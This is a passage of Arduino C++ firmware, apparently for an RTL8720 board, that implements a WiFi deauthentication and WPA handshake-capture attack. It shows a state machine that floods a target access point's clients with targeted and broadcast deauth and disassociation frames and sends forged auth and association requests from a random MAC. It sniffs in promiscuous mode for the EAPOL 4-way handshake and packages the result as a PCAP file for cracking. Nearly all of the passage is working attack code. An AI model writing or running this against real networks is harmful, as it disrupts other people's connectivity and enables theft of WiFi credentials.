    while (millis() - sniffPhaseStart < sniffInterval) {
      delay(3);
      if ((millis() - sniffPhaseStart) % 1000 == 0) {
        wext_set_channel(WLAN0_NAME, _selectedNetwork.ch);
      }
// Burst deauth frames (between capture windows): periodic small bursts, don't interrupt promiscuous mode (active mode only)
      if (g_captureMode == CAPTURE_MODE_ACTIVE && g_captureDeauthEnabled && (millis() - lastBurstTs >= 300)) {
        lastBurstTs = millis();
        pruneStaleKnownClients(6000);
        // Pause capture for deauth burst during sniff
        pauseCaptureForDeauth();
        // Priority targeted: when known clients exist, send a few deauth frames to each STA
        if (knownClientCount > 0) {
          DeauthFrame frame;
          memcpy(&frame.source, deauth_bssid, 6);
          memcpy(&frame.access_point, deauth_bssid, 6);
          uint8_t localKnownCount = knownClientCount; if (localKnownCount > 8) localKnownCount = 8;
          for (uint8_t k = 0; k < localKnownCount; k++) {
            const uint8_t *sta = (const uint8_t*)knownClients[k];
            memcpy(&frame.destination, sta, 6);
            // Multiple common reason codes, small bursts
            const uint16_t reasons[3] = {7, 1, 4};
            for (int r = 0; r < 3; r++) { frame.reason = reasons[r]; for (int i = 0; i < 2; i++) { wifi_tx_raw_frame(&frame, sizeof(DeauthFrame)); delayMicroseconds(200); } }
          }
        } else {
          // No known clients: more conservative AP, use sparser broadcast push (once every 3 seconds, max 1 frame)
          static unsigned long lastNoClientBroadcastTs = 0;
          if (millis() - lastNoClientBroadcastTs > 3000) {
            lastNoClientBroadcastTs = millis();
            wifi_tx_broadcast_deauth(deauth_bssid, 7, 1, 1000);
          }
        }
// Resume capture quickly to avoid missing immediate EAPOL
        resumeCaptureAfterDeauth(120);
        wext_set_channel(WLAN0_NAME, _selectedNetwork.ch);
      }
      // Dynamic sensitivity: when M1 or M3 is captured (AP->STA direction with ACK), moderately extend this sniff round
      {
        bool extend = false;
        for (unsigned int i = 0; i < capturedHandshake.frameCount; i++) {
          ParsedEapolInfo einfo;
          bool p = parseEapol(capturedHandshake.frames[i].data, capturedHandshake.frames[i].length, einfo);
          if (!p) p = parseEapolFromEthertype(capturedHandshake.frames[i].data, capturedHandshake.frames[i].length, einfo);
          if (p) {
            bool m1 = einfo.isFromAP && einfo.descriptorType == 0x02 && einfo.hasAck && !einfo.hasMic && !einfo.hasInstall;
            bool m3 = einfo.isFromAP && einfo.hasMic && einfo.hasAck && einfo.hasInstall;
            if (m1 || m3) { extend = true; break; }
          }
        }
        if (extend && sniffInterval < 10000) { sniffInterval = 10000; }
      }
      if (hasBothHandshakeDirections() && capturedManagement.frameCount < 3) {
        if (g_verboseHandshakeLog) Serial.println(F("Early management capture trigger: both directions seen, switching to management capture..."));
        break;
      }
      // Minimum sniff time threshold: at least 1.5 seconds before allowing completion judgment
      if ((millis() - sniffPhaseStart) >= 1500UL && isHandshakeComplete()) {
        if (g_verboseHandshakeLog) Serial.println(F("Complete 4-way handshake detected (after min sniff time), exiting sniff phase early"));
        break;
      }
    }

  if ((millis() - sniffPhaseStart) >= 1500UL && isHandshakeComplete() && capturedManagement.frameCount >= 3) {
      if (g_verboseHandshakeLog) Serial.println(F("Complete handshake and management frames captured, exiting capture loop"));
      break;
    }

    // Efficient mode: if not complete after this window, pause capture -> burst deauth -> wait 2s -> resume capture
    if (g_captureMode == CAPTURE_MODE_EFFICIENT && !isHandshakeComplete()) {
      pauseCaptureForDeauth();
      const uint16_t reasonsE[2] = {7, 1};
      for (int r = 0; r < 2; r++) { wifi_tx_broadcast_deauth(deauth_bssid, reasonsE[r], 80, 150); }
      wifi_tx_broadcast_disassoc(deauth_bssid, 8, 10, 200);
      // Resume promiscuous mode promptly to avoid missing subsequent EAPOL (changed original 2000ms offline wait to online wait)
      resumeCaptureAfterDeauth(100);
      wext_set_channel(WLAN0_NAME, _selectedNetwork.ch);
      delay(1900);
      // Don't increment attempts, directly enter the next sniff window
      continue;
    }

    // Light directed inducement (active mode only): when M1/M3 are captured but M2/M4 are missing, send a few targeted deauth frames to learned STAs to trigger completion
    if (g_captureMode == CAPTURE_MODE_ACTIVE && !isHandshakeComplete() && knownClientCount > 0) {
      bool seenAPOnly = false;
      bool seenClient = false;
      for (unsigned int i = 0; i < capturedHandshake.frameCount; i++) {
        ParsedEapolInfo einfo;
        bool p = parseEapol(capturedHandshake.frames[i].data, capturedHandshake.frames[i].length, einfo);
        if (!p) p = parseEapolFromEthertype(capturedHandshake.frames[i].data, capturedHandshake.frames[i].length, einfo);
        if (p) {
          if (einfo.isFromAP) seenAPOnly = true; else seenClient = true;
        }
      }
      if (seenAPOnly && !seenClient) {
        // Pause capture for targeted deauth inducement
        pauseCaptureForDeauth();
        DeauthFrame frame;
        memcpy(&frame.source, deauth_bssid, 6);
        memcpy(&frame.access_point, deauth_bssid, 6);
        uint8_t localKnownCount = knownClientCount; if (localKnownCount > 8) localKnownCount = 8;
        for (uint8_t k = 0; k < localKnownCount; k++) {
          const uint8_t *sta = (const uint8_t*)knownClients[k];
          memcpy(&frame.destination, sta, 6);
          frame.reason = 1;
          for (int i = 0; i < 3; i++) { // Small quantity, low frequency
            wifi_tx_raw_frame(&frame, sizeof(DeauthFrame));
          }
        }
// Resume capture quickly to avoid missing immediate EAPOL
        resumeCaptureAfterDeauth(120);
        wext_set_channel(WLAN0_NAME, _selectedNetwork.ch);
      }
    }
  }
  
  if ((isHandshakeComplete() || (capturedHandshake.frameCount >= 2 && hasBothHandshakeDirections())) && capturedManagement.frameCount < 3) {
    if (g_verboseHandshakeLog) Serial.println(F("Starting dedicated management frame capture phase..."));
    unsigned long managementCaptureStart = millis();
    const unsigned long managementCaptureTimeout = 20000; // 20s
    allowAnyMgmtFrames = true;
    wifi_set_promisc(RTW_PROMISC_DISABLE, NULL, 1);
    delay(50);
    wifi_set_promisc(RTW_PROMISC_ENABLE_2, rtl8720_sniff_callback, 1);
    while (capturedManagement.frameCount < 3 && (millis() - managementCaptureStart < managementCaptureTimeout)) {
      delay(20);
      if ((millis() - managementCaptureStart) % 1000 == 0) {
        wext_set_channel(WLAN0_NAME, _selectedNetwork.ch);
      }
    }
    allowAnyMgmtFrames = false;
  }
  
  captureAttempts++;
  
  if (g_verboseHandshakeLog) {
    Serial.print(F("Current handshake count: "));
    Serial.print(capturedHandshake.frameCount);
    Serial.print(F(" / "));
    Serial.print(MAX_HANDSHAKE_FRAMES);
    Serial.print(F(", management frames: "));
    Serial.print(capturedManagement.frameCount);
    Serial.print(F(" / "));
    Serial.print(MAX_MANAGEMENT_FRAMES);
    Serial.print(F(", callback triggered: "));
    Serial.print(sniffCallbackTriggered ? "YES" : "NO");
    Serial.print(F(", elapsed time: "));
    Serial.print((millis() - overallStart) / 1000);
    Serial.println(F("s"));
  }
  
  if (!sniffCallbackTriggered && (millis() - overallStart) > 5000) {
    if (g_verboseHandshakeLog) Serial.println(F("No callback triggered, re-enabling promiscuous mode..."));
    wifi_set_promisc(RTW_PROMISC_DISABLE, NULL, 1);
    delay(100);
    wifi_set_promisc(RTW_PROMISC_ENABLE, rtl8720_sniff_callback, 1);
    sniffCallbackTriggered = false;
  }
  
  if (capturedHandshake.frameCount > 0 || capturedManagement.frameCount > 0) {
    if (g_verboseHandshakeLog) {
      Serial.print(F("Partial capture progress: "));
      Serial.print(capturedHandshake.frameCount);
      Serial.print(F(" handshake frames, "));
      Serial.print(capturedManagement.frameCount);
      Serial.println(F(" management frames - continuing..."));
    }
  }
  
  if (isHandshakeComplete() && hasBothHandshakeDirections()) {
    wext_set_channel(WLAN0_NAME, AP_Channel.toInt());
    std::vector<uint8_t> pcapData = generatePcapBuffer();
    if (g_verboseHandshakeLog) { Serial.print(F("PCAP size: ")); Serial.print(pcapData.size()); Serial.println(F(" bytes")); }
    globalPcapData = pcapData;
    handshakeDataAvailable = true;
    isHandshakeCaptured = true;
    // Record stats and time for WebUI display and download
    lastCaptureTimestamp = millis();
    lastCaptureHSCount = (uint8_t)capturedHandshake.frameCount;
    lastCaptureMgmtCount = (uint8_t)capturedManagement.frameCount;
    handshakeJustCaptured = true;
    if (g_verboseHandshakeLog) Serial.println(F("Handshake data saved to global storage"));
    if (g_verboseHandshakeLog) printHandshakeData();
  }
  
  if (g_verboseHandshakeLog) Serial.println(F("Disabling promiscuous mode..."));
  wifi_set_promisc(RTW_PROMISC_DISABLE, NULL, 1);
  delay(200);
  if (g_verboseHandshakeLog) Serial.println(F("Restoring original channel..."));
  wext_set_channel(WLAN0_NAME, AP_Channel.toInt());
  delay(200);
  if (g_verboseHandshakeLog) Serial.println(F("Finished deauth+sniff cycle."));
  readyToSniff = false;
  sniffer_active = false;
  if (g_verboseHandshakeLog) Serial.println(F("=== Handshake capture completed status updated ==="));
  // Remove 4-frame fallback: only show captured in WebUI when strict completion logic sets handshakeDataAvailable
  // Capture complete LED indicator (set before clearing running flag)
  extern void completeHandshakeLED();
  completeHandshakeLED();
  // After capture flow ends, clear running flag to avoid WebUI getting stuck
  extern bool hs_sniffer_running;
  hs_sniffer_running = false;
}

// Start non-blocking capture (initialization)
void deauthAndSniff() {
  sniffer_active = true;
  // Reset capture buffers.
  resetCaptureData();

  // Stop existing packet detection to avoid conflicts
  if (g_verboseHandshakeLog) Serial.println(F("Stopping existing packet detection..."));
  wifi_set_promisc(RTW_PROMISC_DISABLE, NULL, 1);
  
  // Ensure WiFi is in the correct state
  WiFi.disablePowerSave(); // Disable power saving to ensure stable packet capture

  memcpy(deauth_bssid, _selectedNetwork.bssid, 6);
  
  // Output target network information for debugging
  if (g_verboseHandshakeLog) {
    Serial.print(F("Target network: "));
    Serial.print(_selectedNetwork.ssid);
    Serial.print(F(" ("));
    Serial.print(macToString(_selectedNetwork.bssid, 6));
    Serial.print(F(") on channel "));
    Serial.println(_selectedNetwork.ch);
  }
  
  // Check if the target network is valid
  if (_selectedNetwork.ch == 0 || _selectedNetwork.ssid == "") {
    Serial.println(F("ERROR: Invalid target network selected!"));
    sniffer_active = false;
    readyToSniff = false;
    return;
  }
  
  // Set the channel to the target AP's channel.
  if (g_verboseHandshakeLog) { Serial.print(F("Setting channel to: ")); Serial.println(_selectedNetwork.ch); }
  int channelResult = wext_set_channel(WLAN0_NAME, _selectedNetwork.ch);
  if (g_verboseHandshakeLog) { Serial.print(F("Channel set result: ")); Serial.println(channelResult); }
  
  // Start state machine
  g_captureState = CAPTURE_STATE_INIT;
  g_captureStateStartTime = millis();
  g_overallCaptureStartTime = millis();
  g_captureAttempts = 0;
  g_preDeauthPacketCount = 0;
  g_deauthPacketCount = 0;
  g_promiscEnabled = false;
  g_lastBurstTime = 0;
  g_lastChannelCheckTime = 0;
  
  Serial.println(F("[NonBlocking] Capture state machine initialized"));
}

// Non-blocking capture main loop (called from main program loop)
void deauthAndSniff_update() {
  // User stop requested, immediately exit state machine
  if (g_attackStop) {
    g_captureState = CAPTURE_STATE_IDLE;
    sniffer_active = false;
    return;
  }
  if (g_captureState == CAPTURE_STATE_IDLE) return;
  
  unsigned long currentTime = millis();
  
  // Check overall timeout
  if (currentTime - g_overallCaptureStartTime > 60000) {
    Serial.println(F("[NonBlocking] Overall timeout reached"));
    g_captureState = CAPTURE_STATE_COMPLETE;
    return;
  }
  
  // Execute operations according to state
  switch (g_captureState) {
    case CAPTURE_STATE_IDLE:
      // Idle state, return directly
      return;
      
    case CAPTURE_STATE_INIT:
      // WiFi configuration, channel setup, start promiscuous mode
      if (currentTime - g_captureStateStartTime > 200) {
        // Enable promiscous mode BUT keep SoftAP active
        if (g_verboseHandshakeLog) Serial.println(F("Enabling promiscuous mode for handshake capture..."));
        int promiscResult = wifi_set_promisc(RTW_PROMISC_ENABLE_2, rtl8720_sniff_callback, 1);
        if (g_verboseHandshakeLog) { Serial.print(F("Promiscuous mode result: ")); Serial.println(promiscResult); }
        
        g_promiscEnabled = true;
        g_promiscEnabledMs = millis();
        
        // Active inducement (disabled in strict mode to avoid false positives from fake clients)
        if (!strictCaptureMode) {
          uint8_t baitSta[6];
          baitSta[0] = 0x02; // locally administered, unicast
          baitSta[1] = random(256);
          baitSta[2] = random(256);
          baitSta[3] = random(256);
          baitSta[4] = random(256);
          baitSta[5] = random(256);
          addKnownClient(baitSta);
          Serial.print(F("[Bait] Send auth/assoc from STA ")); Serial.println(macToString(baitSta,6));
          // Send authentication and association requests
          wifi_tx_auth_req(baitSta, _selectedNetwork.bssid);
          delay(10);
          wifi_tx_assoc_req(baitSta, _selectedNetwork.bssid, _selectedNetwork.ssid.c_str());
        }
        
        // Transition to pre-inducement state
        g_captureState = CAPTURE_STATE_PRE_DEAUTH;
        g_captureStateStartTime = currentTime;
        Serial.println(F("[NonBlocking] Entering PRE_DEAUTH state"));
      }
      break;
      
    case CAPTURE_STATE_PRE_DEAUTH:
      // Send pre-deauth frames (batched, send small amounts per call)
      if (g_captureMode != CAPTURE_MODE_PASSIVE) {
        // Combine common reason codes, send in batches
        if (!g_attackStop) {
          const uint16_t reasons[] = {7, 1};
          for (int r = 0; r < 2; r++) {
            // Send several frames per reason code (moderate total to avoid prolonged blocking)
            wifi_tx_broadcast_deauth(deauth_bssid, reasons[r], 30, 200); // Reduce per-batch count
            g_preDeauthPacketCount += 30;
          }
          // A small number of disassociation frames
          wifi_tx_broadcast_disassoc(deauth_bssid, 8, 5, 300); // Reduce per-batch count
          g_preDeauthPacketCount += 5;
        }
        
        // Wait for AP and STA state convergence: efficient mode 2000ms, other modes 3000ms
        unsigned long waitTime = (g_captureMode == CAPTURE_MODE_EFFICIENT) ? 2000 : 3000;
        if (currentTime - g_captureStateStartTime > waitTime) {
          g_captureState = CAPTURE_STATE_DEAUTH_PHASE;
          g_captureStateStartTime = currentTime;
          Serial.println(F("[NonBlocking] Entering DEAUTH_PHASE state"));
        }
      } else {
        Serial.println(F("[Deauth] Skipping pre-deauth (PASSIVE mode)"));
        g_captureState = CAPTURE_STATE_DEAUTH_PHASE;
        g_captureStateStartTime = currentTime;
      }
      break;
      
    case CAPTURE_STATE_DEAUTH_PHASE:
      // Last for 1.5 seconds, send a few deauth frames per call
      if (g_captureMode == CAPTURE_MODE_ACTIVE) {
        if (currentTime - g_captureStateStartTime < 1500) {
          // Reduce channel switch frequency to avoid impacting WebUI connections
          if (currentTime - g_lastChannelCheckTime > 1000) { // Check channel every 1 second
            wext_set_channel(WLAN0_NAME, _selectedNetwork.ch);
            g_lastChannelCheckTime = currentTime;
          }
          
          // Pause capture while sending deauth
          pauseCaptureForDeauth();
          if (g_attackStop) break;  // Stop requested, break immediately
          
          if (g_verboseHandshakeLog) { Serial.print(F("Target BSSID: ")); Serial.println(macToString(deauth_bssid, 6)); }
          
          const int maxDeauthPerCall = 50; // Max 50 frames per call
          int sentThisCall = 0;
          
          // Keep a longer time window in the deauth phase to avoid prematurely pruning newly learned clients
          pruneStaleKnownClients(15000);
          
          if (knownClientCount > 0) {
            DeauthFrame frame;
            memcpy(&frame.source, deauth_bssid, 6);
            memcpy(&frame.access_point, deauth_bssid, 6);
            // Reduce log noise to avoid affecting capture
            uint8_t localKnownCount = knownClientCount; if (localKnownCount > 8) localKnownCount = 8;
            for (uint8_t k = 0; k < localKnownCount && sentThisCall < maxDeauthPerCall; k++) {
              const uint8_t *sta = (const uint8_t*)knownClients[k];
              memcpy(&frame.destination, sta, 6);
              // Send small bursts to known clients: multi-reason-code combo for better compatibility
              const uint16_t reasons[3] = {7, 1, 4};
              for (int r = 0; r < 3 && sentThisCall < maxDeauthPerCall; r++) {
                frame.reason = reasons[r];
                for (int i = 0; i < 2 && sentThisCall < maxDeauthPerCall; i++) { 
                  wifi_tx_raw_frame(&frame, sizeof(DeauthFrame)); 
                  sentThisCall++; 
                  delayMicroseconds(200); 
                }
              }
            }
          } else {
            // No known clients: use extremely lightweight broadcast deauth/disassoc to wake STAs for later learning
            // Control transmission volume to avoid affecting capture and AP stability
            const uint16_t reasonsD[2] = {7, 1};
            for (int r = 0; r < 2 && sentThisCall < maxDeauthPerCall; r++) {
              wifi_tx_broadcast_deauth(deauth_bssid, reasonsD[r], 1, 500);
              sentThisCall += 1;
            }
            // Optional: one lightweight disassociation
            wifi_tx_broadcast_disassoc(deauth_bssid, 8 /*inactivity*/, 1, 500);
            sentThisCall += 1;
          }
          
          g_deauthPacketCount += sentThisCall;
          
          // Resume capture quickly to avoid missing immediate M1
          resumeCaptureAfterDeauth(120);
          wext_set_channel(WLAN0_NAME, _selectedNetwork.ch);
        } else {
          // Deauth phase complete, entering sniff phase
          g_captureState = CAPTURE_STATE_SNIFF_PHASE;
          g_captureStateStartTime = currentTime;
          Serial.println(F("[NonBlocking] Entering SNIFF_PHASE state"));
        }
      } else {
        Serial.println(F("[Deauth] Skipping deauth phase (non-ACTIVE mode)"));
        g_captureState = CAPTURE_STATE_SNIFF_PHASE;
        g_captureStateStartTime = currentTime;
      }
      break;
      
    case CAPTURE_STATE_SNIFF_PHASE: {
      // Last 7-15 seconds (mode-dependent), perform a small deauth burst every 300ms (active mode)
      unsigned long sniffInterval = (g_captureMode == CAPTURE_MODE_EFFICIENT) ? 15000 : 7000;
      
      if (currentTime - g_captureStateStartTime < sniffInterval) {
        // 减少频道切换频率以避免影响WebUI连接
        if (currentTime - g_lastChannelCheckTime > 1000) { // 每1秒检查一次频道
          wext_set_channel(WLAN0_NAME, _selectedNetwork.ch);
          g_lastChannelCheckTime = currentTime;
        }
        
        // Burst deauth frames (between capture windows): periodic small bursts, don't interrupt promiscuous mode (active mode only)
        if (g_captureMode == CAPTURE_MODE_ACTIVE && g_captureDeauthEnabled && (currentTime - g_lastBurstTime >= 300)) {
          g_lastBurstTime = currentTime;
          pruneStaleKnownClients(6000);
          // Pause capture for deauth burst during sniff
          pauseCaptureForDeauth();
          if (g_attackStop) break;  // Stop check
          // Priority targeted: when known clients exist, send a few deauth frames to each STA
          if (knownClientCount > 0) {
            DeauthFrame frame;
            memcpy(&frame.source, deauth_bssid, 6);
            memcpy(&frame.access_point, deauth_bssid, 6);
            uint8_t localKnownCount = knownClientCount; if (localKnownCount > 8) localKnownCount = 8;
            for (uint8_t k = 0; k < localKnownCount; k++) {
              const uint8_t *sta = (const uint8_t*)knownClients[k];
              memcpy(&frame.destination, sta, 6);
              // Multiple common reason codes, small bursts
              const uint16_t reasons[3] = {7, 1, 4};
              for (int r = 0; r < 3; r++) { 
                frame.reason = reasons[r]; 
                for (int i = 0; i < 2; i++) { 
                  wifi_tx_raw_frame(&frame, sizeof(DeauthFrame)); 
                  delayMicroseconds(200); 
                } 
              }
            }
          } else {
            // No known clients: more conservative AP, use sparser broadcast push (once every 3 seconds, max 1 frame)
            static unsigned long lastNoClientBroadcastTs = 0;
            if (currentTime - lastNoClientBroadcastTs > 3000) {
              lastNoClientBroadcastTs = currentTime;
              wifi_tx_broadcast_deauth(deauth_bssid, 7, 1, 1000);
            }
          }
          // Resume capture quickly to avoid missing immediate EAPOL
          resumeCaptureAfterDeauth(120);
          wext_set_channel(WLAN0_NAME, _selectedNetwork.ch);
        }
        
        // Dynamic sensitivity: when M1 or M3 is captured (AP->STA direction with ACK), moderately extend this sniff round
        bool extend = false;
        for (unsigned int i = 0; i < capturedHandshake.frameCount; i++) {
          ParsedEapolInfo einfo;
          bool p = parseEapol(capturedHandshake.frames[i].data, capturedHandshake.frames[i].length, einfo);
          if (!p) p = parseEapolFromEthertype(capturedHandshake.frames[i].data, capturedHandshake.frames[i].length, einfo);
          if (p) {
            bool m1 = einfo.isFromAP && einfo.descriptorType == 0x02 && einfo.hasAck && !einfo.hasMic && !einfo.hasInstall;
            bool m3 = einfo.isFromAP && einfo.hasMic && einfo.hasAck && einfo.hasInstall;
            if (m1 || m3) { extend = true; break; }
          }
        }
        if (extend && sniffInterval < 10000) { sniffInterval = 10000; }
        
        if (hasBothHandshakeDirections() && capturedManagement.frameCount < 3) {
          if (g_verboseHandshakeLog) Serial.println(F("Early management capture trigger: both directions seen, switching to management capture..."));
          g_captureState = CAPTURE_STATE_MGMT_CAPTURE;
          g_captureStateStartTime = currentTime;
          break;
        }
        // Minimum sniff time threshold: at least 1.5 seconds before allowing completion judgment
        if ((currentTime - g_captureStateStartTime) >= 1500UL && isHandshakeComplete()) {
          if (g_verboseHandshakeLog) Serial.println(F("Complete 4-way handshake detected (after min sniff time), exiting sniff phase early"));
          // Generate handshake packet data
          std::vector<uint8_t> pcapData = generatePcapBuffer();
          if (g_verboseHandshakeLog) { Serial.print(F("PCAP size: ")); Serial.print(pcapData.size()); Serial.println(F(" bytes")); }
          globalPcapData = pcapData;
          // Set handshake captured flag
          isHandshakeCaptured = true;
          handshakeDataAvailable = true;
          // Record stats and time
          lastCaptureTimestamp = millis();
          lastCaptureHSCount = (uint8_t)capturedHandshake.frameCount;
          lastCaptureMgmtCount = (uint8_t)capturedManagement.frameCount;
          handshakeJustCaptured = true;
          g_captureState = CAPTURE_STATE_MGMT_CAPTURE;
          g_captureStateStartTime = currentTime;
          break;
        }
        
        // Real-time check: if enough frames are captured, immediately validate and set flags
        if (capturedHandshake.frameCount >= 4 && capturedManagement.frameCount >= 3) {
          if (isHandshakeComplete()) {
            Serial.println(F("[NonBlocking] Complete handshake detected during sniff, setting flags"));
            // Generate handshake packet data
            std::vector<uint8_t> pcapData = generatePcapBuffer();
            if (g_verboseHandshakeLog) { Serial.print(F("PCAP size: ")); Serial.print(pcapData.size()); Serial.println(F(" bytes")); }
            globalPcapData = pcapData;
            // Set handshake captured flag
            isHandshakeCaptured = true;
            handshakeDataAvailable = true;
            // Record stats and time
            lastCaptureTimestamp = millis();
            lastCaptureHSCount = (uint8_t)capturedHandshake.frameCount;
            lastCaptureMgmtCount = (uint8_t)capturedManagement.frameCount;
            handshakeJustCaptured = true;
            g_captureState = CAPTURE_STATE_COMPLETE;
            break;
          }
        }
      } else {
        // Sniff phase complete, first check if a complete handshake already exists
        if (capturedHandshake.frameCount >= 4 && capturedManagement.frameCount >= 3) {
          if (isHandshakeCompleteQuickCapture()) {
            Serial.println(F("[NonBlocking] Complete handshake detected at sniff phase end, setting flags"));
            // Generate handshake packet data
            std::vector<uint8_t> pcapData = generatePcapBuffer();
            if (g_verboseHandshakeLog) { Serial.print(F("PCAP size: ")); Serial.print(pcapData.size()); Serial.println(F(" bytes")); }
            globalPcapData = pcapData;
            // Set handshake captured flag
            isHandshakeCaptured = true;
            handshakeDataAvailable = true;
            // Record stats and time
            lastCaptureTimestamp = millis();
            lastCaptureHSCount = (uint8_t)capturedHandshake.frameCount;
            lastCaptureMgmtCount = (uint8_t)capturedManagement.frameCount;
            handshakeJustCaptured = true;
            g_captureState = CAPTURE_STATE_COMPLETE;
            Serial.println(F("[NonBlocking] Entering COMPLETE state"));
          } else {
            Serial.println(F("[NonBlocking] Invalid handshake detected, clearing stats and restarting"));
            // Clear stats and restart capture
            resetCaptureData();
            resetGlobalHandshakeData();
            // Restart capture state machine
            g_captureState = CAPTURE_STATE_INIT;
            g_captureStateStartTime = currentTime;
            Serial.println(F("[NonBlocking] Restarting capture state machine"));
          }
        } else if ((isHandshakeCompleteQuickCapture() || (capturedHandshake.frameCount >= 2 && hasBothHandshakeDirections())) && capturedManagement.frameCount < 3) {
          g_captureState = CAPTURE_STATE_MGMT_CAPTURE;
          g_captureStateStartTime = currentTime;
          Serial.println(F("[NonBlocking] Entering MGMT_CAPTURE state"));
        } else if (g_captureMode == CAPTURE_MODE_EFFICIENT && !isHandshakeComplete()) {
          g_captureState = CAPTURE_STATE_EFFICIENT_BURST;
          g_captureStateStartTime = currentTime;
          Serial.println(F("[NonBlocking] Entering EFFICIENT_BURST state"));
        } else {
          g_captureState = CAPTURE_STATE_COMPLETE;
          Serial.println(F("[NonBlocking] Entering COMPLETE state"));
        }
      }
      break;
    }
      
    case CAPTURE_STATE_EFFICIENT_BURST:
      // Efficient mode: if not complete after this window, pause capture -> burst deauth -> wait 2s -> resume capture
      if (!isHandshakeComplete()) {
        pauseCaptureForDeauth();
        if (g_attackStop) break;  // Stop check
        const uint16_t reasonsE[2] = {7, 1};
        for (int r = 0; r < 2; r++) { 
          wifi_tx_broadcast_deauth(deauth_bssid, reasonsE[r], 40, 150); // Reduce per-batch count
        }
        wifi_tx_broadcast_disassoc(deauth_bssid, 8, 5, 200); // Reduce per-batch count
        // Resume promiscuous mode promptly to avoid missing subsequent EAPOL (changed original 2000ms offline wait to online wait)
        resumeCaptureAfterDeauth(100);
        wext_set_channel(WLAN0_NAME, _selectedNetwork.ch);
        
        // Wait 1.9 seconds then re-enter sniff phase
        if (currentTime - g_captureStateStartTime > 1900) {
          g_captureState = CAPTURE_STATE_SNIFF_PHASE;
          g_captureStateStartTime = currentTime;
          Serial.println(F("[NonBlocking] Re-entering SNIFF_PHASE state"));
        }
      } else {
        g_captureState = CAPTURE_STATE_MGMT_CAPTURE;
        g_captureStateStartTime = currentTime;
      }
      break;
      
    case CAPTURE_STATE_MGMT_CAPTURE:
      // Capture management frames, max 20 seconds
      if (capturedManagement.frameCount < 3 && (currentTime - g_captureStateStartTime < 20000)) {
        // Check channel every 1 second
        if (currentTime - g_lastChannelCheckTime > 1000) {
          wext_set_channel(WLAN0_NAME, _selectedNetwork.ch);
          g_lastChannelCheckTime = currentTime;
        }
        
        // Ensure promiscuous mode is enabled
        if (!g_promiscEnabled) {
          allowAnyMgmtFrames = true;
          wifi_set_promisc(RTW_PROMISC_DISABLE, NULL, 1);
          delay(50);
          wifi_set_promisc(RTW_PROMISC_ENABLE_2, rtl8720_sniff_callback, 1);
          g_promiscEnabled = true;
        }
        
        // Real-time check: if enough frames are captured, immediately validate and set flags
        if (capturedHandshake.frameCount >= 4 && capturedManagement.frameCount >= 3) {
          if (isHandshakeComplete()) {
            Serial.println(F("[NonBlocking] Complete handshake detected during mgmt capture, setting flags"));
            // Generate handshake packet data
            std::vector<uint8_t> pcapData = generatePcapBuffer();
            if (g_verboseHandshakeLog) { Serial.print(F("PCAP size: ")); Serial.print(pcapData.size()); Serial.println(F(" bytes")); }
            globalPcapData = pcapData;
            // Set handshake captured flag
            isHandshakeCaptured = true;
            handshakeDataAvailable = true;
            // Record stats and time
            lastCaptureTimestamp = millis();
            lastCaptureHSCount = (uint8_t)capturedHandshake.frameCount;
            lastCaptureMgmtCount = (uint8_t)capturedManagement.frameCount;
            handshakeJustCaptured = true;
            allowAnyMgmtFrames = false;
            g_captureState = CAPTURE_STATE_COMPLETE;
            break;
          }
        }
      } else {
        allowAnyMgmtFrames = false;
        // Management frame capture phase complete, check if a full handshake already exists
        if (capturedHandshake.frameCount >= 4 && capturedManagement.frameCount >= 3) {
          if (isHandshakeCompleteQuickCapture()) {
            Serial.println(F("[NonBlocking] Complete handshake detected at mgmt phase end, setting flags"));
            // Generate handshake packet data
            std::vector<uint8_t> pcapData = generatePcapBuffer();
            if (g_verboseHandshakeLog) { Serial.print(F("PCAP size: ")); Serial.print(pcapData.size()); Serial.println(F(" bytes")); }
            globalPcapData = pcapData;
            // Set handshake captured flag
            isHandshakeCaptured = true;
            handshakeDataAvailable = true;
            // Record stats and time
            lastCaptureTimestamp = millis();
            lastCaptureHSCount = (uint8_t)capturedHandshake.frameCount;
            lastCaptureMgmtCount = (uint8_t)capturedManagement.frameCount;
            handshakeJustCaptured = true;
          } else {
            Serial.println(F("[NonBlocking] Invalid handshake detected at mgmt phase end, clearing stats and restarting"));
            // Clear stats and restart capture
            resetCaptureData();
            resetGlobalHandshakeData();
            // Restart capture state machine
            g_captureState = CAPTURE_STATE_INIT;
            g_captureStateStartTime = currentTime;
            Serial.println(F("[NonBlocking] Restarting capture state machine from mgmt phase"));
            return; // Return directly, don't enter COMPLETE state
          }
        }
        g_captureState = CAPTURE_STATE_COMPLETE;
        Serial.println(F("[NonBlocking] Entering COMPLETE state"));
      }
      break;
      
    case CAPTURE_STATE_COMPLETE:
      // Completion processing logic
      if (g_verboseHandshakeLog) {
        Serial.print(F("Current handshake count: "));
        Serial.print(capturedHandshake.frameCount);
        Serial.print(F(" / "));
        Serial.print(MAX_HANDSHAKE_FRAMES);
        Serial.print(F(", management frames: "));
        Serial.print(capturedManagement.frameCount);
        Serial.print(F(" / "));
        Serial.print(MAX_MANAGEMENT_FRAMES);
        Serial.print(F(", callback triggered: "));
        Serial.print(sniffCallbackTriggered ? "YES" : "NO");
        Serial.print(F(", elapsed time: "));
        Serial.print((currentTime - g_overallCaptureStartTime) / 1000);
        Serial.println(F("s"));
      }
      
      // Before checking flag, first verify handshake integrity
      if (capturedHandshake.frameCount >= 4 && capturedManagement.frameCount >= 3) {
        Serial.println(F("[NonBlocking] Checking handshake completeness..."));
        if (isHandshakeCompleteQuickCapture()) {
          Serial.println(F("[NonBlocking] Handshake completeness verified, setting flags"));
          // Generate handshake packet data
          std::vector<uint8_t> pcapData = generatePcapBuffer();
          if (g_verboseHandshakeLog) { Serial.print(F("PCAP size: ")); Serial.print(pcapData.size()); Serial.println(F(" bytes")); }
          globalPcapData = pcapData;
          // Set handshake captured flag
          isHandshakeCaptured = true;
          handshakeDataAvailable = true;
          // Record stats and time
          lastCaptureTimestamp = millis();
          lastCaptureHSCount = (uint8_t)capturedHandshake.frameCount;
          lastCaptureMgmtCount = (uint8_t)capturedManagement.frameCount;
          handshakeJustCaptured = true;
        } else {
          Serial.println(F("[NonBlocking] Invalid handshake detected in complete state, clearing stats and restarting"));
          // Clear stats and restart capture
          resetCaptureData();
          resetGlobalHandshakeData();
          // Restart capture state machine
          g_captureState = CAPTURE_STATE_INIT;
          g_captureStateStartTime = currentTime;
          Serial.println(F("[NonBlocking] Restarting capture state machine from complete state"));
          return; // Return directly, don't continue completion flow
        }
      }
      
      // Check if handshake was successfully captured
      if (isHandshakeCaptured && handshakeDataAvailable) {
        Serial.println(F("[NonBlocking] Handshake captured successfully!"));
        // Capture complete LED indicator
        extern void completeHandshakeLED();
